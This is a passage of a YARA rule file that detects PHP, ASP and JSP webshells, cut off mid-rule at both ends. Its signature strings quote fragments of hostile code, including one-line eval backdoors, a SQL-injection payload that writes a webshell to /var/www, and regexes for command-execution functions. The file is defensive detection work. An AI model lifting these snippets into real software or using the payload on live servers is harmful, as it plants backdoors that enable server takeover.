	$gfp9 = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
	$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
	$gfp11 = "(eval (getenv \"EPROLOG\")))"
	$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/ ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
	$cpayload1 = /\beval[\t ]*\([^)]/ nocase ascii
	$cpayload2 = /\bexec[\t ]*\([^)]/ nocase ascii
	$cpayload3 = /\bshell_exec[\t ]*\([^)]/ nocase ascii
	$cpayload4 = /\bpassthru[\t ]*\([^)]/ nocase ascii
	$cpayload5 = /\bsystem[\t ]*\([^)]/ nocase ascii
	$cpayload6 = /\bpopen[\t ]*\([^)]/ nocase ascii
	$cpayload7 = /\bproc_open[\t ]*\([^)]/ nocase ascii
	$cpayload8 = /\bpcntl_exec[\t ]*\([^)]/ nocase ascii
	$cpayload9 = /\bassert[\t ]*\([^)0]/ nocase ascii
	$cpayload10 = /\bpreg_replace[\t ]*\(.{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase ascii
	$cpayload12 = /\bmb_ereg_replace[\t ]*\([^\)]{1,100}'e'/ nocase ascii
	$cpayload13 = /\bmb_eregi_replace[\t ]*\([^\)]{1,100}'e'/ nocase ascii
	$cpayload20 = /\bcreate_function[\t ]*\([^)]/ nocase ascii
	$cpayload21 = /\bReflectionFunction[\t ]*\([^)]/ nocase ascii
	$m_cpayload_preg_filter1 = /\bpreg_filter[\t ]*\([^\)]/ nocase ascii
	$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
condition:
	filesize < 500 and not ( any of ( $gfp* ) ) and ( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and ( any of ( $cpayload* ) or all of ( $m_cpayload_preg_filter* ) ) and ( ( #obf1 + #obf2 ) > 2 or #obf3 > 10 )
}
rule Php_Webshell_ChinaChopper_Generic
{
strings:
	$x_aspx = /%@\sPage\sLanguage=.Jscript.%><%eval\(RequestItem\[.{,100}unsafe/
	$x_php = /<?php.\@eval\(\$_POST./
	$fp1 = "GET /"
	$fp2 = "POST /"
condition:
	1 of ($x*) and not 1 of ($fp*)
}
rule Php_Webshell_Weevely_Webshell
{
strings:
	$s0 = /\$[a-z]{4} = \$[a-z]{4}\("[a-z][a-z]?",[\s]?"",[\s]?"/ ascii
	$s1 = /\$[a-z]{4} = str_replace\("[a-z][a-z]?","","/ ascii
	$s2 = /\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\)\)\); \$[a-z]{4}\(\);/ ascii
	$s4 = /\$[a-z]{4}="[a-zA-Z0-9]{70}/ ascii
condition:
	uint32(0) == 0x68703f3c and all of ($s*) and filesize > 570 and filesize < 800
}
rule Php_Webshell_webshell_h4ntu_shell_powered_by_tsoi_
{
strings:
	$s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b"
	$s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui"
	$s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= "
	$s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\" value=\"<?php echo stripslashes(htmlentities($"
condition:
	all of them
}
rule Php_Webshell_webshell_PHP_sql
{
strings:
	$s0 = "$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_"
	$s4 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
condition:
	all of them
}
rule Php_Webshell_webshell_PHP_a
{
strings:
	$s1 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\""
	$s2 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>"
	$s4 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> " fullword
condition:
	2 of them
}
rule Php_Webshell_webshell_iMHaPFtp_2
{
strings:
	$s8 = "if ($l) echo '<a href=\"' . $self . '?action=permission&amp;file=' . urlencode($"
	$s9 = "return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA"
condition:
	1 of them
}
rule Jsp_Webshell_webshell_Jspspyweb
{
strings:
	$s0 = "      out.print(\"<tr><td width='60%'>\"+strCut(convertPath(list[i].getPath()),7"
	$s3 = "  \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control"
condition:
	all of them
}
rule Php_Webshell_webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2
{
strings:
	$s0 = "die(\"\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\n"
	$s1 = "Mode Shell v1.0</font></span></a></font><font face=\"Webdings\" size=\"6\" color"
condition:
	1 of them
}
rule Php_Webshell_webshell_SimAttacker_Vrsion_1_0_0_priv8_4_My_friend
{
strings:
	$s2 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo"
	$s3 = "fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
condition:
	1 of them
}
rule Php_Webshell_webshell_phpshell_2_1_pwhash
{
strings:
	$s1 = "<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pi"
	$s3 = "word: \"<tt>null</tt>\", \"<tt>yes</tt>\", \"<tt>no</tt>\", \"<tt>true</tt>\","
condition:
	1 of them
}
rule Php_Webshell_webshell_PHPRemoteView
{
strings:
	$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
	$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
condition:
	1 of them
}
rule Jsp_Webshell_webshell_jsp_12302
{
strings:
	$s0 = "</font><%out.print(request.getRealPath(request.getServletPath())); %>" fullword
	$s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword
	$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
condition:
	all of them
}
rule Php_Webshell_webshell_caidao_shell_guo
{
strings:
	$s0 = "<?php ($www= $_POST['ice'])!"
	$s1 = "@preg_replace('/ad/e','@'.str_rot13('riny').'($ww"
condition:
	1 of them
}
rule Php_Webshell_webshell_PHP_redcod
{
strings:
	$s0 = "H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw" fullword
	$s1 = "HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_remview_fix
{
strings:
	$s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
	$s5 = "echo \"<P><hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n"
condition:
	1 of them
}
rule Asp_Webshell_webshell_asp_cmd
{
strings:
	$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
	$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
	$s3 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
condition:
	1 of them
}
rule Php_Webshell_webshell_php_sh_server
{
strings:
	$s0 = "eval(getenv('HTTP_CODE'));" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_PH_Vayv_PH_Vayv
{
strings:
	$s0 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in"
	$s4 = "<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style"
condition:
	1 of them
}
rule Php_Webshell_webshell_caidao_shell_ice
{
strings:
	$s0 = "<%eval request(\"ice\")%>" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_cihshell_fix
{
strings:
	$s7 = "<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty"
	$s8 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos"
condition:
	1 of them
}
rule Asp_Webshell_webshell_asp_shell
{
strings:
	$s7 = "<input type=\"submit\" name=\"Send\" value=\"GO!\">" fullword
	$s8 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_Private_i3lue
{
strings:
	$s8 = "case 15: $image .= \"\\21\\0\\"
condition:
	all of them
}
rule Php_Webshell_webshell_php_up
{
strings:
	$s0 = "copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);" fullword
	$s3 = "if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {" fullword
	$s8 = "echo \"Uploaded file: \" . $HTTP_POST_FILES['userfile']['name'];" fullword
condition:
	2 of them
}
rule Php_Webshell_webshell_Mysql_interface_v1_0
{
strings:
	$s0 = "echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return"
condition:
	all of them
}
rule Php_Webshell_webshell_php_s_u
{
strings:
	$s6 = "<a href=\"?act=do\"><font color=\"red\">Go Execute</font></a></b><br /><textarea"
condition:
	all of them
}
rule Php_Webshell_webshell_phpshell_2_1_config
{
strings:
	$s1 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines." fullword
condition:
	all of them
}
rule Asp_Webshell_webshell_asp_EFSO_2
{
strings:
	$s0 = "%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB"
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_up
{
strings:
	$s9 = "// BUG: Corta el fichero si es mayor de 640Ks" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_NetworkFileManagerPHP
{
strings:
	$s9 = "  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted "
condition:
	all of them
}
rule Php_Webshell_webshell_Server_Variables
{
strings:
	$s7 = "<% For Each Vars In Request.ServerVariables %>" fullword
	$s9 = "Variable Name</B></font></p>" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_caidao_shell_ice_2
{
strings:
	$s0 = "<?php ${${eval($_POST[ice])}};?>" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_caidao_shell_mdb
{
strings:
	$s1 = "<% execute request(\"ice\")%>a " fullword
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_guige
{
strings:
	$s0 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null"
condition:
	all of them
}
rule Php_Webshell_webshell_phpspy2010
{
strings:
	$s3 = "eval(gzinflate(base64_decode("
	$s5 = "//angel" fullword
	$s8 = "$admin['cookiedomain'] = '';" fullword
condition:
	all of them
}
rule Asp_Webshell_webshell_asp_ice
{
strings:
	$s0 = "D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC"
condition:
	all of them
}
rule Php_Webshell_webshell_drag_system
{
strings:
	$s9 = "String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_"
condition:
	all of them
}
rule Asp_Webshell_webshell_DarkBlade1_3_asp_indexx
{
strings:
	$s3 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou"
condition:
	all of them
}
rule Php_Webshell_webshell_phpshell3
{
strings:
	$s2 = "<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];"
	$s5 = "<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna"
	$s7 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";" fullword
condition:
	2 of them
}
rule Jsp_Webshell_webshell_jsp_hsxa
{
strings:
	$s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_utils
{
strings:
	$s0 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword
	$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
condition:
	all of them
}
rule Asp_Webshell_webshell_asp_01
{
strings:
	$s0 = "<%eval request(\"pass\")%>" fullword
condition:
	all of them
}
rule Asp_Webshell_webshell_asp_404
{
strings:
	$s0 = "lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2"
condition:
	all of them
}
rule Php_Webshell_webshell_webshell_cnseay02_1
{
strings:
	$s0 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU"
condition:
	all of them
}
rule Php_Webshell_webshell_php_fbi
{
strings:
	$s7 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo"
condition:
	all of them
}
rule Php_Webshell_webshell_B374kPHP_B374k
{
strings:
	$s0 = "Http://code.google.com/p/b374k-shell" fullword
	$s1 = "$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'"
	$s3 = "Jayalah Indonesiaku & Lyke @ 2013" fullword
	$s4 = "B374k Vip In Beautify Just For Self" fullword
condition:
	1 of them
}
rule Asp_Webshell_webshell_cmd_asp_5_1
{
strings:
	$s9 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_php_dodo_zip
{
strings:
	$s0 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x"
	$s3 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
condition:
	all of them
}
rule Php_Webshell_webshell_aZRaiLPhp_v1_0
{
strings:
	$s5 = "echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($"
	$s7 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo"
condition:
	all of them
}
rule Php_Webshell_webshell_php_list
{
strings:
	$s1 = "// list.php = Directory & File Listing" fullword
	$s2 = "    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena"
	$s9 = "// by: The Dark Raver" fullword
condition:
	1 of them
}
rule Php_Webshell_webshell_ironshell
{
strings:
	$s4 = "print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\""
	$s8 = "print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di"
condition:
	all of them
}
rule Php_Webshell_webshell_caidao_shell_404
{
strings:
	$s0 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St"
condition:
	all of them
}
rule Asp_Webshell_webshell_ASP_aspydrv
{
strings:
	$s3 = "<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi"
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_web
{
strings:
	$s0 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request."
condition:
	all of them
}
rule Php_Webshell_webshell_mysqlwebsh
{
strings:
	$s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#"
condition:
	all of them
}
rule Jsp_Webshell_webshell_jspShell
{
strings:
	$s0 = "<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on"
	$s1 = "onblur=\"document.shell.autoUpdate.checked= this.oldValue;"
condition:
	all of them
}
rule Php_Webshell_webshell_Dx_Dx
{
strings:
	$s1 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
	$s9 = "class=linelisting><nobr>POST (php eval)</td><"
condition:
	1 of them
}
rule Asp_Webshell_webshell_asp_ntdaddy
{
strings:
	$s9 = "if  FP  =  \"RefreshFolder\"  or  "
	$s10 = "request.form(\"cmdOption\")=\"DeleteFolder\"  "
condition:
	1 of them
}
rule Php_Webshell_webshell_MySQL_Web_Interface_Version_0_8
{
strings:
	$s2 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>"
condition:
	all of them
}
rule Php_Webshell_webshell_elmaliseker_2
{
strings:
	$s1 = "<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx"
	$s6 = "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but"
condition:
	all of them
}
rule Asp_Webshell_webshell_ASP_RemExp
{
strings:
	$s0 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques"
	$s1 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal"
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_list1
{
strings:
	$s1 = "case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive"
	$s9 = "return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\""
condition:
	all of them
}
rule Php_Webshell_webshell_phpkit_1_0_odd
{
strings:
	$s0 = "include('php://input');" fullword
	$s1 = "// No eval() calls, no system() calls, nothing normally seen as malicious." fullword
	$s2 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_123
{
strings:
	$s0 = "<font color=\"blue\">??????????????????:</font><input type=\"text\" size=\"7"
	$s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
	$s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    " fullword
condition:
	all of them
}
rule Asp_Webshell_webshell_asp_1
{
strings:
	$s4 = "!22222222222222222222222222222222222222222222222222" fullword
	$s8 = "<%eval request(\"pass\")%>" fullword
condition:
	all of them
}
rule Asp_Webshell_webshell_ASP_tool
{
strings:
	$s0 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\""
	$s3 = "Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" "
	$s9 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas"
condition:
	2 of them
}
rule Php_Webshell_webshell_cmd_win32
{
strings:
	$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam"
	$s1 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
condition:
	2 of them
}
rule Jsp_Webshell_webshell_jsp_jshell
{
strings:
	$s0 = "kXpeW[\"" fullword
	$s4 = "[7b:g0W@W<" fullword
	$s5 = "b:gHr,g<" fullword
	$s8 = "RhV0W@W<" fullword
	$s9 = "S_MR(u7b" fullword
condition:
	all of them
}
rule Asp_Webshell_webshell_ASP_zehir4
{
strings:
	$s9 = "Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/"
condition:
	all of them
}
rule Php_Webshell_webshell_wsb_idc
{
strings:
	$s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)" fullword
	$s3 = "{eval($_GET['idc']);}" fullword
condition:
	1 of them
}
rule Php_Webshell_webshell_cpg_143_incl_xpl
{
strings:
	$s3 = "$data=\"username=\".urlencode($USER).\"&password=\".urlencode($PA"
	$s5 = "fputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time"
condition:
	1 of them
}
rule Asp_Webshell_webshell_mumaasp_com
{
strings:
	$s0 = "&9K_)P82ai,A}I92]R\"q!C:RZ}S6]=PaTTR"
condition:
	all of them
}
rule Php_Webshell_webshell_php_404
{
strings:
	$s0 = "$pass = md5(md5(md5($pass)));" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_webshell_cnseay_x
{
strings:
	$s9 = "$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_"
condition:
	all of them
}
rule Asp_Webshell_webshell_asp_up
{
strings:
	$s0 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio"
	$s1 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword
condition:
	1 of them
}
rule Php_Webshell_webshell_phpkit_0_1a_odd
{
strings:
	$s1 = "include('php://input');" fullword
	$s3 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
	$s4 = "// uses include('php://input') to execute arbritary code" fullword
	$s5 = "// php://input based backdoor" fullword
condition:
	2 of them
}
rule Asp_Webshell_webshell_ASP_cmd
{
strings:
	$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_PHP_Shell_x3
{
strings:
	$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
	$s6 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
	$s9 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset("
condition:
	2 of them
}
rule Php_Webshell_webshell_PHP_g00nv13
{
strings:
	$s1 = "case \"zip\": case \"tar\": case \"rar\": case \"gz\": case \"cab\": cas"
	$s4 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p"
condition:
	all of them
}
rule Php_Webshell_webshell_php_h6ss
{
strings:
	$s0 = "<?php eval(gzuncompress(base64_decode(\""
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_zx
{
strings:
	$s0 = "if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.g"
condition:
	all of them
}
rule Php_Webshell_webshell_Ani_Shell
{
strings:
	$s0 = "$Python_CODE = \"I"
	$s6 = "$passwordPrompt = \"\\n================================================="
	$s7 = "fputs ($sockfd ,\"\\n==============================================="
condition:
	1 of them
}
rule Jsp_Webshell_webshell_jsp_k8cmd
{
strings:
	$s2 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_cmd
{
strings:
	$s6 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_k81
{
strings:
	$s1 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword
	$s9 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword
condition:
	1 of them
}
rule Asp_Webshell_webshell_ASP_zehir
{
strings:
	$s9 = "Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&"
condition:
	all of them
}
rule Php_Webshell_webshell_Worse_Linux_Shell
{
strings:
	$s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD"
condition:
	all of them
}
rule Php_Webshell_webshell_zacosmall
{
strings:
	$s0 = "if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\"</strong><hr>"
condition:
	all of them
}
rule Php_Webshell_webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit
{
strings:
	$s1 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_redirect
{
strings:
	$s7 = "var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" "
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_cmdjsp
{
strings:
	$s5 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_Java_Shell
{
strings:
	$s4 = "public JythonShell(int columns, int rows, int scrollback) {" fullword
	$s9 = "this(null, Py.getSystemState(), columns, rows, scrollback);" fullword
condition:
	1 of them
}
rule Asp_Webshell_webshell_asp_1d
{
strings:
	$s0 = "+9JkskOfKhUxZJPL~\\(mD^W~[,{@#@&EO"
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_IXRbE
{
strings:
	$s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
condition:
	all of them
}
rule Php_Webshell_webshell_PHP_G5
{
strings:
	$s3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op"
condition:
	all of them
}
rule Php_Webshell_webshell_PHP_r57142
{
strings:
	$s0 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_tree
{
strings:
	$s5 = "$('#tt2').tree('options').url = \"selectChild.action?checki"
	$s6 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ"
condition:
	all of them
}
rule Php_Webshell_webshell_C99madShell_v_3_0_smowu
{
strings:
	$s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for"
	$s8 = "<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty"
condition:
	1 of them
}
rule Php_Webshell_webshell_simple_backdoor
{
strings:
	$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
	$s1 = "if(isset($_REQUEST['cmd'])){" fullword
	$s4 = "system($cmd);" fullword
condition:
	2 of them
}
rule Php_Webshell_webshell_PHP_404
{
strings:
	$s4 = "<span>Posix_getpwuid (\"Read\" /etc/passwd)"
condition:
	all of them
}
rule Php_Webshell_webshell_Macker_s_Private_PHPShell
{
strings:
	$s3 = "echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n"
	$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
	$s7 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
condition:
	all of them
}
rule Php_Webshell_webshell_Antichat_Shell_v1_3_2
{
strings:
	$s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m"
condition:
	all of them
}
rule Php_Webshell_webshell_Safe_mode_breaker
{
strings:
	$s5 = "preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is("
	$s6 = "$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL)."
condition:
	1 of them
}
rule Php_Webshell_webshell_Sst_Sheller
{
strings:
	$s2 = "echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>"
	$s3 = "<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)"
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_list
{
strings:
	$s0 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
	$s2 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn"
	$s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_PHPJackal_v1_5
{
strings:
	$s7 = "echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form"
	$s8 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr"
condition:
	all of them
}
rule Php_Webshell_webshell_customize
{
strings:
	$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
condition:
	all of them
}
rule Php_Webshell_webshell_s72_Shell_v1_1_Coding
{
strings:
	$s5 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya "
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_sys3
{
strings:
	$s1 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword
	$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
	$s9 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword
condition:
	all of them
}
rule Jsp_Webshell_webshell_jsp_guige02
{
strings:
	$s0 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff"
	$s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private"
condition:
	all of them
}
rule Php_Webshell_webshell_php_ghost
{
strings:
	$s1 = "<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'"
	$s6 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***"
	$s7 = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\"" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_WinX_Shell
{
strings:
	$s5 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">Filenam"
	$s8 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">File: </"
condition:
	all of them
}
rule Php_Webshell_webshell_Crystal_Crystal
{
strings:
	$s1 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value"
